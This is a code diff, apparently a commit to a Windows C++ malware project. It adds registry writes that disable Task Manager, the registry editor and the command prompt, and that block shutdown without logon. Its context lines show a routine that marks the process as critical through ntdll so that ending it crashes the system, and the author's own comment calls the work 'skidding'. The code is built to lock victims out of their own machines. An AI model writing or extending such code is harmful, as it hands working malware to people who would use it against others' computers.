@@ -1,4 +1,5 @@
 #include "_main.h"
+#include "_registry.h"
 
 typedef NTSTATUS(WINAPI* pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
 typedef NTSTATUS(WINAPI* pRtlSetProcessIsCritical)(BOOLEAN, PBOOLEAN, BOOLEAN);
@@ -65,7 +66,7 @@ void main::note() {
 }
 
 void main::wallpaper() {
-	SystemParametersInfoA(
+	SystemParametersInfoW(
 		SPI_SETDESKWALLPAPER,
 		NULL,
 		(PVOID)"",
@@ -77,17 +78,37 @@ void main::wallpaper() {
 }
 
 void main::reg_keys() {
-	/*
-		disable task mgr
-		disable regedit
-		disable cmd
-		disable keyboard scancode map
-		swap mouse buttons
-		disable shutdown without login
-	*/
+	registry::createKey(
+		HKEY_CURRENT_USER,
+		registry::POLICY,
+		L"DisableTaskMgr",
+		(DWORD)TRUE
+	);
+
+	registry::createKey(
+		HKEY_CURRENT_USER,
+		registry::POLICY,
+		L"DisableRegistryTools",
+		(DWORD)TRUE
+	);
+
+	registry::createKey(
+		HKEY_CURRENT_USER,
+		registry::SYSTEM,
+		L"DisableCMD",
+		(DWORD)TRUE
+	);
+
+	registry::createKey(
+		HKEY_LOCAL_MACHINE,
+		registry::POLICY,
+		L"ShutdownWithoutLogon",
+		(DWORD)FALSE
+	);
 }
 
-void main::critical() { // skidding speedrun
+// skidding speedrun
+void main::critical() {
 	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
 
 	pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(
